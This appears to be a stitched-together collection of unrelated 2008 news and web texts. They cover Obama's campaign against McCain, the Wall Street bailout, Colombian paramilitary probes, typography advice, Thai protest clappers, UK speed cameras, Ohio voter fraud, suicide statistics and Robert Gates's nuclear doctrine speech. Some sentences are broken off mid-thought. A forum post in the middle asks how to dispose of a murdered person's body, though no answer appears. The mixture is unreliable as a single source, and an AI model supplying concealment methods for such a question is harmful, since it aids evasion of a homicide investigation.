But the turn towards McCain would renew the original challenge in a different form .
Against Clinton , his best card had been the one he wanted to play , the call for new politics .
Against McCain , he was expected to wield a blunter instrument : the charge that McCain ’s party had made a complete hash of everything .
An obvious tack , but it complicated his call for post - partisan reconciliation .
His stump speech had from the start been full of economic prescriptions – though these were often overlooked in the focus on his rhetorical crescendos – and he had given several serious addresses on Wall Street reform , demonstrating a deeper engagement on the subject than McCain .
Yet the pitch lacked an overarching thrust , a lunge for the Republican jugular .
It was as if Obama was held back by what he knew , that much of the country ’s economic pain had as much to do with global upheavals as with the Bush tax cuts and trade policies .
As if he knew his forays into populism in the primaries had edged into protectionist demagoguery , and that an African - American candidate could afford to sound only just so angry and intense .
But it was also as if he thought that winning on the economy was somehow too easy and more conventional than what he had really set out to do in this campaign .
To those unnerved by his gifts , the African roots and Muslim name only ratcheted up the distrust .
Where do they make people like this ?
Not around here
Chatting with me early in the primaries , David Axelrod , Obama 's strategist , said not to expect the usual partisan fire from Obama : " He 's never been an aficionado of the cheap applause line .
Voters get sold short .
They 're smart and sophisticated .
They realise that it 's important to replace a Republican with a Democrat , but that it wo n't do enough " , if " all we do is change parties without challenging our politics " .
This sort of talk unnerved Democrats who did not understand why many of Obama 's ads against McCain did not hammer the Republican brand more aggressively .
They fretted about how Obama 's discursive style would fare in the debates , even though he had shown improvement over the course of his countless encounters with Clinton .
Obama 's challenge on the economy also involved an awkward political reality .
Even as the weak economy was making him the alleged favourite , he was in fact lagging in states and regions that had been hit the hardest under Bush .
Conditions had only worsened across the Rust Belt since 2004 , when Kerry won Michigan and Pennsylvania and narrowly lost Ohio , yet all summer Obama was barely holding on to the first two and lagging in the third .
Meanwhile , the former Republican strongholds he was hoping to nab , Virginia and Colorado , were states that remained relatively prosperous .
The easy explanation for this paradox was racial prejudice , but something broader was at work .
Over the past decade , Democrats had gained with college - educated professionals and in the more dynamic regions , in formerly Republican areas such as northern Virginia and the Philadelphia suburbs , while Republicans had claimed distressed states that had been Democratic , such as West Virginia , places that felt increasingly disconnected from the megalopolises that candidates of the Kerry and Gore kind most represented .
Leading Democrats were worrying about Obama 's struggle to carry conservative " Reagan Democrats " whom Clinton had won in the primaries in places like western Pennsylvania , yet many of them had already deserted the party for Bush , and Kerry and Gore had carried that state anyway .
Sure , Clinton had a better shot at reclaiming them , and Obama could not lose too many of them , but they were no longer the base of the party , certainly not of his party .
Not that race did n’t play into it .
For some , particularly older voters , Obama was the first affirmative - action nominee , period .
Bob Norman , a retired awning maker , was blunt when I came to his door in the working - class Cleveland suburb of Parma .
“ The media ’s letting him sled on down the hill because he ’s coloured , ” he said .
Marlene Newlon , a landlord in Grafton , West Virginia , offered a more direct variant as we strolled down the street of that shrivelled railroad town : “ I ’m not voting for a black president .
I ’m sorry . ”
On the flipside , who knew how many of the young voters who were shattering all assumptions about their endemic apathy were doing so to flaunt their tolerance , a benefit gained from a youth spent listening to Kanye West and imitating Kobe Bryant ?
And there was the basic fact that what Obama had done was essentially to carry the same highly educated liberals attracted to reformers past ( Bradley , Howard Dean , Gary Hart ) and then , thanks in part to his heritage , add to them black voters , breaking up the coalition that had helped past machine Democrats stave off the highbrow types .
The more interesting role of race , though , lay in the way Obama 's ethnic particulars exacerbated the split perception of his talent .
To those unnerved by his gifts , the African roots and Muslim name only further ratcheted the distrust :
Where do they make people like this ?
Not around here . . .
Meanwhile , among his admirers , much was made of Obama 's ability , as a biracial American , to embrace and represent all .
But was it not also true that for many his appeal lay in all the things he was not - that his confounding of the stereotypes on either side only made him more appealing for those inclined to admire such singularity ?
Consider a black politician of equivalent aptitude with typically African - American roots .
Would not his uniqueness have been more obscured than Obama 's by discussions of racial redemption and his embodiment of a group ?
And consider a young white Democrat with the same outsized skills .
Would the ambition that drives Obama be writ more conspicuously , and unappealingly , on the face of a rising star who could not , like Obama , be said to be putting his talents towards the cause of national reconciliation ?
If this bright young white candidate gazed into the distance as is Obama 's wont , chin upturned just so , might it appear to voters as if he were thinking only of himself , not of history ?
Thus did the elite candidate who happened also to be the first serious black candidate move into the home stretch .
McCain picked up where Clinton left off with his “ Country First ” theme , casting Obama as a self - aggrandising climber and going so far as to charge that “ Obama would rather lose a war in order to win a political campaign ” .
There were the “ celebrity ” ads , which in a clever twist showed Obama in a dazzling light , smiling broadly before 200,000 Berliners – he is a star , you are not , and he knows it .
But the most direct counter to the audacity of talent would come from Sarah Palin .
Here was a culture warrior from the front lines , her pro-life convictions evident in her decision to carry to term a baby with Down 's syndrome and to encourage her pregnant 17 - year - old to marry and start a family .
In her convention speech , Palin delivered with gusto a speech that bristled with rural resentment , including a quotation from the notorious arch - conservative , anti-Semitic columnist Westbrook Pegler : " We grow good people in our small towns , with honesty and sincerity and dignity . "
This was followed by a string of bold appeals to the heartland , including her declaration that " it 's time that normal Joe Six - Pack American is finally represented in the position of vice - presidency " .
Challenges to her qualifications brought retorts about Obama 's own swift rise , to which Obama partisans wanted to respond that it was less about résumés than about capacity and learning and engagement with the broader world .
They wanted to say this , but with the spectre of Jefferson 's yeoman looming , they mostly held their tongue and grimaced - until , to their delight , Palin 's glaring struggles in her television interviews made their case for them .
Palin 's stunning burst into the Outside , as Alaskans call the Lower 48 , was soon enough trumped by cataclysm , the Wall Street meltdown .
And within two weeks , the financial crisis had , among other things , utterly reshaped the presidential race , throwing a bevy of key swing states into clear leads for Obama .
This was received as predictable - any evidence of economic plight worked to Obama 's benefit , right ?
But this had not been the case all year .
The economy had been in decline all campaign , and yet Obama had failed to open as wide a lead as many Democrats thought he should .
Yet something was different now .
At one level , the sheer scale of the devastation was prompting a partisan shift that brushed aside all else , a furious lashing out at the incumbent party , maybe even an ideological epiphany .
Beyond that , however , it seemed possible that Obama was at last benefiting from the politics of thoughtfulness .
Voters who had lost their jobs in Steeltown , USA a year ago had wanted to see more passion than Obama was able or willing to provide .
But voters terrified and perplexed about this more abstract , far - reaching crisis wanted something else : to know that the people in charge were thinking hard and carefully before acting .
They wanted to see serious deliberation among wise men .
Many voters rightly saw the crisis as the fault of the coastal elite , the MBAs who had made their millions pushing paper in New York and the hedge - fund outpost of Greenwich , Connecticut .
But voters also saw that a crisis this grave and convoluted required an elite response , measured , informed , competent .
And as Obama reacted with his usual restraint - restraint bordering on detachment - and as McCain jerked into a more haphazard response , the needle moved .
McCain , so long simply a default option for voters wary of Obama , had , between the Palin pick and response to the crisis , come to seem " unsafe " in his own right , polls showed .
Voters saw that a crisis this grave required an elite response , measured , informed , competent .
McCain had come to seem “ unsafe ” in his own right
The numbers continued to move after their first two debates , where Obama met McCain ’s visible contempt with yet more calm , to the frustration of some of his own supporters .
Just like that , he was suddenly in command , finally riding the current of economic distress , and positioned to close the deal with the far superior ground organisation and money machine he had been building all year .
McCain , meanwhile , made a final attempt to frame the out - of - nowhere talent he was up against as threatening .
Palin started it off , with new warnings about the radical / professor whom Obama once knew in Chicago .
" Our opponent . . . is someone who sees America , it seems , as being so imperfect , imperfect enough that he 's palling around with terrorists who would target their own country , " she said on the trail in Colorado .
" This is not a man who sees America as you see America and as I see America . "
Such remarks provoked a virulent sort of enthusiasm from members of the party base who now dominated McCain - Palin events .
Among undecideds , however , Obama again appeared to be reaping the benefits of his demeanour - exotic as he was , his extreme moderation made it harder for voters to picture him in cahoots with bomb - throwers .
His surrogates scolded McCain and Palin for inciting the crowd , and a somewhat abashed McCain tried to switch to a more temperate tone .
And Obama plodded happily along , proposing a new $ 60 bn economic relief package on 13 October before retiring to Toledo , Ohio - selected for its proximity to all those long - suffering post - industrial voters who seemed to be finally warming to him - to prepare for the final presidential debate .
Before Palin 's debut , and before the markets fell apart , Obama had his final chance at a mass , unmediated presentation of the meritocrat 's case , at the Denver convention .
The McCain camp howled at Obama 's choice of a 76,000 - seat stadium and the classical backdrop constructed for the stage , and even many Democrats cringed , but they should have seen it coming .
This campaign , after all , had been launched on aspiration and presumption .
Not for him the cramped indoor podium where a hundred other pols had all , in their way , made the customary appeal to the average voter in the average state .
Barack Obama was betting , again , that America was ready for a little elevation .
So much hung in the dry , thin air of Denver - not just the rest of this astonishing campaign , but also everything after that .
What would come of all this if he made it , and finally had the chance to embark on the work he had spent 21 months talking about ?
How would a post - partisan candidate rein in a Democratic congressional majority out to run roughshod ?
How would the decisions be made at day's end when all due deliberation had run its course , and the thoughtful unifier was in the position of having to make one side or the other unhappy ?
( Most immediately : would he stand by his calls for middle - class tax cuts and big spending on health care , alter native energy and infrastructure , even as the deficit hawks claimed these things were now unaffordable ?
Would he raise taxes on the wealthy and on capital gains even in a deep recession ? )
How would his reform push fare in a Washington so calcified by lobbyists and corporate lucre , and how disappointed would his expectant base be by the inevitable lapses and compromises ?
Most of all , how would this man , who had never run anything but a law review , a Senate office and his campaign staff , fare as national leader in a time of ultimate stress ?
From early in the campaign , he had opened his stump speeches by declaring he was running now because " we are at a defining moment in our history " and " cannot afford to wait " .
To some ears , it sounded grandiose .
Now , it was all too true .
Was this more than he had bargained for - or was this just the sort of moment for which the natural aristocrat was made ?
But first , the speech .
He laced it with enough partisan fire to satisfy the back - seat drivers worried that he had been insufficiently tough in the face of McCain 's barrage .
Yet near the end he managed to return to the idea that got it all going back in Iowa a year earlier , and in Boston three years before that , only now it came with the extra edge of having seen just how many were hoping he would fail .
" For part of what has been lost these past eight years can't just be measured by lost wages or bigger trade deficits .
What has also been lost is our sense of common purpose - our sense of higher purpose .
And that 's what we have to restore , " he said .
" I know there are those who . . . dismiss such beliefs as happy talk .
They claim that our insistence on something larger , something firmer and more honest in our public life is just a Trojan horse for higher taxes and the abandonment of traditional values .
And that 's to be expected .
Because if you do n't have any fresh ideas , then you use stale tactics to scare the voters .
If you do n't have a record to run on , then you paint your opponent as someone people should run from . . .
You make a big election about small things .
And you know what - it 's worked before .
Because it feeds into the cynicism we all have about government . . .
But I stand before you tonight because all across America something is stirring . "
With just a couple weeks to go , amid earth - shaping gusts even stronger than what he has been creating for nearly two years , it 's looking like he might be right .

Obama pledges spending cuts , says crisis not ' accident of history '

GREEN BAY , Wisconsin ( AFP ) - Democrat Barack Obama Monday warned the Wall Street meltdown was no mere " accident of history " but proved the need for sweeping change to purge the waste and abuse staining US politics .
Obama 's Republican rival John McCain meanwhile cautioned that a staggering 700 billion dollar government bailout plan for reeling finance firms vested a single official with unprecedented power with little or no accountability .
The presidential foes fought to distinguish themselves on the economy as the temperature of the race heated up ahead of Friday 's first of three head - to - head debates , which offer final chances for either to land a knock - out blow .
Obama attempted to use the crisis to reignite his crusade for political change , while McCain sought to revive his image as a grizzled fighter who does not balk at confronting his own party in the struggle for reform .
" We did not arrive at this moment by some accident of history , " Obama said in the key midwestern state of Wisconsin , as he lashed " greed and irresponsibility " in both Washington and Wall Street .
" We are in this mess because of a bankrupt philosophy that says we should give more and more to those with the most and hope that prosperity trickles down to the rest of us .
" We must reform the waste and abuse in our government , we must reform the rules of the road that let Wall Street run wild and stuck Main Street with the bill -- we must change Washington now . "
Obama argued that Senator McCain , after years in Washington was partly to blame for the bankrupt political climate , and accused him of stuffing his campaign leadership with corporate lobbyists .
McCain , campaigning in the battleground of Pennsylvania , hit back that Obama was guilty of a " lack of leadership " on the finance crisis , mining for votes of blue - collar Democrats and independents who have yet to warm to his rival .
" I am greatly concerned about the plan that gives a single individual the unprecedented power to spend one trillion dollars without any meaningful accountability , " he said in Scranton , former hometown of Democratic vice presidential hopeful Joseph Biden .
" Never before in the history of our nation has so much power and money been concentrated in the hands of one person .
" This arrangement makes me deeply uncomfortable .
When we are talking about trillions of dollars of taxpayer money ' trust me ' is simply not good enough . "
The proposed bailout plan would allow US Treasury Secretary Henry Paulson to sell new debt to buy vast amounts of mortgage securities and other " toxic " assets that have clogged the financial system .
McCain called for an oversight board made up of figures respected in the business world such as billionaire financier Warren Buffett , his Republican primary opponent Mitt Romney and New York mayor Michael Bloomberg .
He also warned against " golden parachutes " for executives of disgraced Wall Street firms , saying they should not get salaries higher than top government officials .
Obama proposed a list of reforms in Washington which he said would help clear up the mess on Wall Street .
He announced plans to curb influence of lobbyists on the US government , save billions of dollars by reforming government contracting , to eliminate inefficient state programs and modernize financial regulation .
Obama would offer the US Federal Reserve greater supervisory authority over the financial industry , and bolster capital , liquidity and disclosure requirements .
On Sunday , Obama also expressed reservations on the oversight provisions of the Wall Street bailout plan expected to be taken up in Congress as soon as this week .
" I do n't think it can be a blank check , " Obama said on CNBC .
" We can set up a system where there 's an independent overseer , maybe the chairman of the Federal Reserve Bank and the Democrats and the Republicans each appoint somebody to oversee the system , " Obama said .
Unlike Paulson and other Republicans , who called for a simple rescue deal , Obama said the plan working through Congress must protect hard - pressed voters on " Main Street " and not just corporate managers and shareholders .

Advertisement Human Rights Watch ( HRW ) has accused the Colombian government of blocking investigations into alleged links between paramilitaries and politicians .
Thousands of demobilised fighters have given evidence implicating more than 60 of President Alvaro Uribe 's supporters , including his cousin Mario .
HRW , a New York - based group , said Mr Uribe 's government was " sabotaging " the investigation - a claim he has denied .
The government later said the report was " ridiculous " and " full of lies " .
" The men and women of Colombia want total clarity and quickly about the circumstances around the violence against institutions and the population by armed groups , " the vice - presidency said .
" To pretend that this is not the interest of the government is ridiculous . "
" The government believes that these and other clear falsehoods in the report are due to problems of reading comprehension by those who typed it because it refuses to believe that these impressions are due to bad intentions , " it added .
' Powerful friends ' Colombia 's right - wing Paramilitaries have been accused of extensive abuses during the long - running civil conflict .
The burden is now on the Uribe administration and Colombia 's institutions of justice to ensure that paramilitaries , as well as their accomplices , are held accountable
Jose Miguel Vivanco
Human Rights Watch
The HRW report , entitled " Breaking the Grip ?
Obstacles to Justice for Paramilitary Mafias in Colombia , " claims that President Uribe 's administration was " jeopardising efforts to secure justice " .
" Colombia 's justice institutions have made enormous progress in investigating paramilitaries and their powerful friends , " said Jose Miguel Vivanco , one of the authors .
" But the Uribe administration keeps taking steps that could sabotage these investigations . "
HRW said such measures included making baseless accusations against members of the Supreme Court , which is running the investigation , and blocking efforts to reform Congress to eliminate paramilitary influence .
The group also said the extradition to the US of 14 paramilitary leaders in May this year had interrupted ongoing investigations .
Mr Uribe has denied any obstruction and said his government had " combated the paramilitaries with more force , effectiveness and decisiveness than any other in Colombia 's history " .
' Efforts squandered '
Several dozen Congressmen , all of them supporters of Mr Uribe , are already being investigated over alleged links with paramilitaries .
Thousands of former fighters have given evidence to the investigation
They were named in the testimonies of demobilised fighters who agreed to confess in exchange for reduced jail terms .
Mr Vivanco said international pressure was crucial to ensure that efforts made by prosecutors were not " squandered " .
" The burden is now on the Uribe administration and Colombia 's institutions of justice to ensure that paramilitaries , as well as their accomplices , are held accountable , " he said .
The BBC's Jeremy McDermott in Colombia says the failure so far to uncover the true nature of the paramilitary activity could be one of the reasons behind a recent growth in such groups .
A new generation of paramilitary groups dedicated to drugs trafficking has sprung up , with up to 8,000 members , our correspondent says .
Paramilitaries emerged during Colombia 's four decade - long civil war .

" It would not be a wise move but one which would divide EU rather then unify it .
Bypass is a method used to cure an heart attack , but is not a suitable method for cooperation within the EU .
The EU hopefully , does not suffer from heart attacks , " he said .
An unprecedented popular protest led Congress to reject the Treasury ’s initial bailout plan on Monday , September 29 .
Most commentators have noted how ironic and seemingly out - of - character it was that the bailout was defeated mainly by Republicans , and indeed by the party ’s right - wing Bible Belt Conservatives .
But would it be too much to hope that these Congressmen bore in mind the Christian ethic embodied in Matthew 18 – almost literally a Biblical condemnation of the bailout ’s terms ?
This wonderful passage describes how Peter came to Jesus and asked about forgiveness – mainly the forgiveness of debts .
In ancient languages the words for “ sin ” and “ debt ” were the same , in an epoch when .
Sinners typically atoned for their offenses and “ trespasses ” by making a compensation payment .
Jesus told a parable of a king calling in one of his officials , who owed him 10 thousand talents – not unlike today ’s government seeking to collect monies due from Citibank , JPMorgan Chase and other Wall Street financial firms .
When the royal servant was unable to come up with the money , the king consigned him and his family to debt bondage .
But the official “ fell down and worshipped him , saying , Lord , have patience with me , and I will pay thee all . ”
The analogy here is with Mr. Paulson ’s allies on Wall Street promising that , somehow , the Treasury may end up being repaid and may even make a profit by buying $ 700 billion in junk mortgages .
“ Then the lord of that servant was moved with compassion , and loosed him , and forgave him the debt . ”
This is what the compassionate Mr. Paulson is proposing to do .
The Treasury will buy “ trash for cash , ” taking junk mortgages and other bad loans at whatever price the financial speculators paid , without obliging them to take a loss .
In the Matthew 18 parable the royal official “ went out and found one of his fellow servants , who owed him a hundred pence ; and he laid hands on him , and took him by the throat , saying , ‘ Pay me what you owe . ’”
The debtor begged the creditor for forgiveness just as the creditor himself had begged the king .
But the creditor was not moved , and “ went out and cast the debtor into prison , till he should pay the debt . ”
Other debtors saw what was happening and worried that the same fate was in store for them , so they went to the king and told him what had happened .
The king got angry and called in the creditor and said , ‘ Oh , thou wicked servant .
I forgave thee all that debt … should n’t you also have had compassion on thy fellow servant , even as I had pity on thee ? ’
The king then threw him “ to his tormentors , till he should pay all that was due unto him . ”
This is where Congress has dropped the ball .
It is telling the banks – and the administrators whom the Treasury is hiring to recover “ taxpayer money ” – to act in a hard - hearted way and lead the economy even further down the road to debt peonage .
Consumers , homeowners and other debtors defaulting on their student loans , car loans and medical debts are not to get relief from the shrinking economy , rising consumer prices and falling asset prices .
But Wall Street is to be able to avoid any loss at all .
It is supposed to repay in five years – that is , two presidential terms from now .
So the Christian parallel is broken .
The moral in the above parable , Jesus explained ( Matthew 18:35 ) , was that “ So likewise shall my heavenly Father do unto you , if ye from your hearts forgive not every one his brother their trespasses , ” that is , their debts .
But Wall Street and Congress must be atheists , because the way that matters are working out today , only the wealthy are being forgiven their debts , not the poor .
The big sinners are going free , their victims are being stripped of their assets .
This is of course what happened historically in the Roman Empire on its way to debt bondage and serfdom .
That is the secular road on which Congress set the economy last week .
This is hopefully not important for anyone .
It is simply a public record of what happened in case it is useful because of a problem .

First Principles
Typography is not a science .
Typography is an art .
There are those who ’d like to ‘ scientificize ’ ; those who believe that a large enough sample of data will somehow elicit good typography .
However , this sausage - machine mentality will only ever produce sausages .
That typography and choosing type is not a science trammeled by axioms and rules is a cause to rejoice .
Before we get to the nitty - gritty of choosing type , let ’s briefly talk about responsibility .
Fundamentally , the responsibility we bear is two - fold : first we owe it to the reader not to hinder their reading pleasure , but to aid it ; second , we owe a responsibility to the typeface or typefaces we employ .
Good typefaces are designed for a good purpose , but not even the very best types are suited to every situation .
Personally , I ’m always a little nervous about using a newly acquired typeface .
A new typeface is something like a newborn baby ( though it does n’t throw - up on you ) : do n’t drop it , squeeze it too hard , hold it upside - down ; in other words , do n’t abuse it , treat it respectfully , carefully .
If you ’ve understood the above two paragraphs , then you ’ll know that what follows is not a set of rules , but rather a list of guiding principles .
Sans or Serif ?
In my opinion , a lot of time is wasted attempting to prove that one is better than the other for setting extended text .
I suggest that you ignore the vague and inconclusive findings of such ramblings and decide for yourself .
Oh , but seriffed types are better for extended text because the serifs lead your eye along …
Stop ! Nonsense .
Rather than write another ten paragraphs on this topic , I ’ll simply say that we read most easily that which we are most familiar with .
( feel free to disagree in the comments below ) .
And if you ’re in any doubt as to whether sans serif typefaces can be used for body text , then turn left at the end of aisle three and make your way over to the Swiss Typography department .
Guideline One : honour content
This , of course , should be every typographer ’s mantra .
In fact good typographers , most likely wo n’t even have to consciously think about this — it ’s instinctual .
[ typography ] is a craft by which the meanings of text ( or its absence of meaning ) can be clarified , honored and shared … .
— Robert Bringhurst
It ’s worth mentioning here that these principles are equally applicable to any medium .
Some of my favorite typefaces look dreadful on screen ; and even good typefaces like Georgia or Verdana , designed especially for the screen , often look at best mediocre on paper .
Choosing type for the web is easier owing to fewer choices ; however , that ’s beginning to change .
We now have sIFR and ‘ web fonts ’ , so it ’s all the more important to think carefully about the type we use .
Is Times / Times New Roman — narrow set and designed for narrow columns — really appropriate for long - line extended text on screen ?
Guideline Two : read it
And , no , I ’m not being facetious .
If you ’re setting text , whether it be for a novel about the Franco - Prussian war or for a single - word headline , read it — really read it .
Reading the text will give up vital clues , not only for choosing the right typeface or typefaces , but will also be an aid in the overall design of the page .
An example : you ’re setting text for an essay on the history of blackletter ; so you set the text in blackletter , right ?
Probably not .
There is a place for considering the historical context ; however , it would be wrong to stick rigidly to this method of choosing type .
If you ’re setting a text on Neanderthal man , you ’re going to run into problems .
( see The Elements of Typographic Style , chapter 6.3 , for excellent coverage of this particular topic ) .
On the other hand , if your only audience is the BAF ( Blackletter Addicts Foundation ) , then perhaps blackletter is appropriate .
In addition to reading the text , one should attempt to understand it .
This is not always possible .
If you ’re setting text for an article on String Theory or Quantum Mechanics , then perhaps full comprehension is out of the question .
However , attempt to understand the thrust or theme of the text .
Guideline Three : audience and canvas
Who will read your beautifully set text ?
Scientists , lawyers , engineers , echo boomers , children ?
If it ’s not obvious from the text , then find out .
Historical ligatures may not go down too well with preschool kids .
Consider too the canvas , the page .
Perhaps you ’re setting text within someone else ’s page design and you have no control over margins or page dimensions .
A cramped page , with small margins may benefit from a lighter type , whereas ample margins may well merit a blacker typeface .
We ’ll look at this in much more detail in a future article .
Guideline Four : does it look right ?
If your text ’s final destination is paper , then print it and see .
Your type might look exquisite on screen , but a train wreck on paper .
There really is no substitute for printing .
If setting for the screen , then check it on both PC and Mac , and at different resolutions ( screen sizes ) .
And finally …
Remind yourself that typography really is an art and that many of the decisions you make , including type choice , are subjective .
If you ’re unsure , ask others ( designers and non-designers ) to read your work .
And seek out examples of great typography .
In future articles we ’ll look at specific case studies , and examples of serif and sans serif typefaces that work well together , together with a list of my favorite typefaces .
Perhaps you have your own methods for choosing type .
If you do , then be sure to share them in the comments .

Many protesters buy bulk - loads of these plastic hands
There are lots of things about Thailand 's long - running anti-government protests to startle a casual visitor .
The toilet paper stalls that lead down to the tangle of plastic tents inside Government House , for example , or the free haircuts handed out to protesters beside its elegant steps .
But perhaps the most surreal hallmark of this political crisis is the craze known as " clapping hands " .
Their noise rises from inside the government compound every few minutes - a sound somewhere between the chattering of insects and the clickety - clack of factory machines .
One for the man who betrayed the country , and one for my husband !
Buntheung , shopping for clappers
It is the sound of thousands of protesters waving the latest must - have accessory - hand - shaped plastic rattles , in lurid colours , which clatter loudly when shaken .
The stalls here sell them in every colour , big or small , tied with string to hang around your neck , or carrying slogans : " Clapper warrior ! " " Clappers stop the evil ! "
" My wife is making me do this ! "
Buntheung is shopping for a new one .
" I already have two , " she tells me , " one for the man who betrayed the country , and one for my husband ! "
I ask her how effective they are .
" Oh it works on the husband , " she says .
And the country , which many people feel has been let down by former prime minister Thaksin Shinawatra and his brother - in - law , the current leader Somchai Wongsawat ?
" We 're almost there , " she says .
The handy thing about the clapping hands is that they can be used to express either agreement or anger .
The daily speeches from the main tent at Government House are punctuated with the rise and fall of the clapping hands .
Protesters , some of whom have been camped out here for months , wave them lazily or vigorously depending on who 's speaking , and what 's being said .
" When I like what they say I just wave it , " says Chin - Noi .
" It 's easier than clapping my own hands .
It 's fun and it makes me happy .
I use a lot of clapper . "
New friends
In fact , there 's a lot of clappers around these days - inside the protest camp and outside it .
If you have one , it means you support the protest
Local businessman Pad-chang
Lots of shoppers browsing the stalls outside the rally admitted to buying up several to give away as souvenirs .
One woman said she 'd been bought dozens as presents .
" I think they 're cute , " she said , " People keep asking me to bring some back for them - they 're very cool . "
Another shopper , businessman Pad-chang , had already bought up several bags of them , and was still browsing .
" You have to test them first , " he said earnestly , " not all of them make a good sound . "
They 're useful , he explained , because they stop your hands from hurting when you clap for too long .
" It 's the easiest way to show your opinion .
When you do n't like someone or you disagree with them , you shake it in front of their face !
But we use it as a greeting too - everyone in my office has clapping hands , and everyone uses it . "
So who are the hands in his bag for ?
" Ah , " he says , " these are for the children of my customers in the south of the country .
You can see it spreading to other provinces .
" I went to a Thaksin stronghold out in the country the other day , and a clerk in the bank waved his clapping hand at me , so I took mine from my pocket and waved it back .
Now we 're friends . "

No escape from the new generation of speed cameras that follow you for 30 miles
A new generation of speed cameras that can track drivers for up to 30 miles and cannot be dodged are being tested by police .
The devices stop motorists evading a ticket by braking suddenly before a camera and then speeding up immediately afterwards .
The new cameras could cover whole areas of cities or suburban housing estates , guarding any number of entry and exit points .
Watching you : New SPECs speed cameras at work in London , left , and a Gatso
By ‘ talking ’ to each other down phone or internet lines , they calculate a car ’s average speed – even if it makes a series of left and right turns down a variety of roads .
The cameras are already in use , but mainly on the motorways .
They are now likely to appear on rural and urban roads , spelling the end for the 6,000 yellow ‘ Gatso - style ’ box cameras currently in use .
Transport minister Jim Fitzpatrick yesterday told a road safety conference that the latest cameras would be a key weapon in the fight to reduce road casualties .
Supporters say they are ‘ fairer ’ , have so far reduced casualties by 50 per cent and encourage a smoother traffic flow and safer , more consistent driving behaviour .
But critics say it is merely a new chapter in the Government ’s war on motorists , who paid £ 106 million in fines last year .
One system , costing £ 200,000 to £ 1 million depending on the size of the area covered , could replace many fixed - point speed cameras .
But although the number of cameras might reduce , greater areas of the road network would be covered .
One of the providers of average speed cameras , SPECs , told the conference that the cameras could be networked together , could be forward or rear facing , could scan multiple lanes and cover areas from 250 yards to nearly 30 miles .
The cameras photograph a number - plate as a vehicle enters the speed restriction zone , and then again when it leaves .
The system then calculates the car ’s average speed between the two points .
If it is higher than the speed limit , the driver is automatically sent a fixed penalty fine and receives three points on their licence .
Mr Fitzpatrick said : ‘ Trials have shown very good results .
Wherever there are average speed camera signs , traffic moves at a uniform speed and crashes reduce . ’
Approval for the new generation of cameras is imminent .
It will be up to local authorities to decide whether to buy the system .
˜ Electronic signs that sense when a car is speeding and switch traffic lights further down the road to red , forcing it to stop , are to be introduced in Britain .
The system , already in use as a traffic calming measure in Spain , will be installed on Camden High Street in North London .
CINCINNATI , Oct. 20 ( UPI ) --
An Ohio judge has appointed a special prosecutor to conduct an investigation into alleged voter fraud after another prosecutor recused himself , officials said .
Hamilton County , Ohio , Common Pleas Court Norbert Nadel appointed Mike O'Neill as special prosecutor in the case Monday after Hamilton County Prosecutor Joe Deters stepped down , The Cincinnati Enquirer reported .

Deters had been accused by Democratic Party leaders of a conflict of interest because of his role as southwest Ohio regional campaign chairman for Republican U.S. presidential nominee John McCain , a U.S. senator from Arizona , the newspaper said .
He had been presiding over a grand jury investigation in which county officials have subpoenaed the complete registration records of about 40 percent of the 671 Cincinnati- area voters who registered and voted between Sept. 30 and Oct. 6 .
" I 'm sensitive that this is going to be a pretty highly charged issue , " O'Neill told the Enquirer .
" The right to a fair and impartial election is sacrosanct . "
If you killed somebody , how would you dispose of the body without getting caught ?

Suppose you killed somebody ...
How would you dispose of the body without getting caught ?
Would you dump it somewhere ?
Bury it in the backyard or basement ?
Dissolve it in lime ?
What ?
What would your master plan be that would allow you to get away with it ?
And no , I have n't killed anybody and I 'm not planning to - I was just curious .
After a decade - long decrease , U.S. suicide rates have started to rise , largely because of an increase in suicides among middle - aged white men and women .
If the economy continues to decline , suicides could go up , researchers say .
White people age 40 to 64 have " recently emerged as a new high - risk group for suicide , " according to the study in the American Journal of Preventive Medicine .
Suicides increased between 1999 and 2005 by about 3 percent annually in white men and 4 percent in white women age 40 to 64 , according to Susan Baker , M.P.H. , of the Johns Hopkins Bloomberg School of Public Health in Baltimore , Maryland , and her colleagues .
Suicide rates remained the same in Asians and Native Americans , and declined in blacks .
Overall , the suicide rate rose in the early 1980s , then dropped each year from 1986 to 1999 .
From 1999 to 2005 , however , the rates have increased 0.7 percent annually .
In all , 32,637 people killed themselves in the United States in 2005 , a rate of 11 per 100,000 people .
Guns are the most common method of suicide , but their use has declined over time .
Suicide by hanging or suffocation has increased among both men and women .
The reason for the increase is unknown .
But if economic conditions continue to decline , suicides could go up .
" This is a concern , especially when one looks at the high rates during the Great Depression , " says Baker .

How exercise can improve your mood
Seetal Dodd , Ph.D. , a senior fellow at the University of Melbourne in Australia , has found that suicide rates tend to fluctuate with the economic trends -- at least in men .

As economy sinks , officials fear violent solutions
The study is cause for concern , Dodd says , because it identifies middle - aged white men as the new high - risk group for suicide -- the same section of the population at risk for suicide during an economic downturn .
" There is a considerable risk that the current economic situation may result in a further spike in the suicide rate for men of working age , especially if we start to see an increase in unemployment and a decrease in housing affordability and consumer sentiment , " Dodd says .
Robert Bossarte , Ph.D. , assistant professor of psychiatry at the University of Rochester in New York , says that people have traditionally focused on suicide prevention in the very young and the old , but not necessarily the middle - aged .
Historically , people over 65 have had the highest suicide rates , but this study suggests that trend is changing .

A number of factors could be affecting the middle - aged , including taking care of aging baby - boomer parents , or coping with substance abuse or unemployment .
Bossarte also notes that while rates are rising in women , men are at greater risk overall .

US defense secretary expands pre-emptive war doctrine to include nuclear strikes
By Alex Lantier
30 October 2008
In a remarkable speech on nuclear policy delivered October 28 at the Carnegie Endowment for International Peace ( CEIP ) , US Defense Secretary Robert Gates painted a dire portrait of international affairs and argued that Washington should expand the doctrine of pre-emptive war formulated by the Bush administration to include possible nuclear strikes .
It is widely rumored that , in the likely event that Democrat Barack Obama wins next week 's US presidential election , Obama will keep Gates as defense secretary .
Gates ' speech , given in the waning days of the Bush presidency , has the character of a policy declaration of the next US administration .
Gates began by making extended and ominous parallels between the world situation today and that which prevailed at the founding of the Carnegie Institute in 1910 , four years before the outbreak of World War I .
At the time , he noted , Wall Street was passing through the panic of 1910 - 1911 and facing a credit crisis , the US had recently put down an insurgency in the Philippines at a cost of 4,200 American lives , comparable to today 's US death toll in Iraq , and " Europe was arming itself to the teeth and forming a series of alliances whose implications were obvious to anyone who cared to look . "
Gates argued that the pacifist illusions promoted by CEIP founder Andrew Carnegie — a US steel magnate at the turn of the 20th century , most famous in the working class movement for the brutal suppression of the 1892 Homestead strike against his company — — should not deter Washington from planning broader war .
He noted , " In August of 1913 , Carnegie said that ‘ the only measure required today for the maintenance of world peace is an agreement between three or four of the leading civilized powers ... pledged to cooperate against disturbers of world peace . ' "
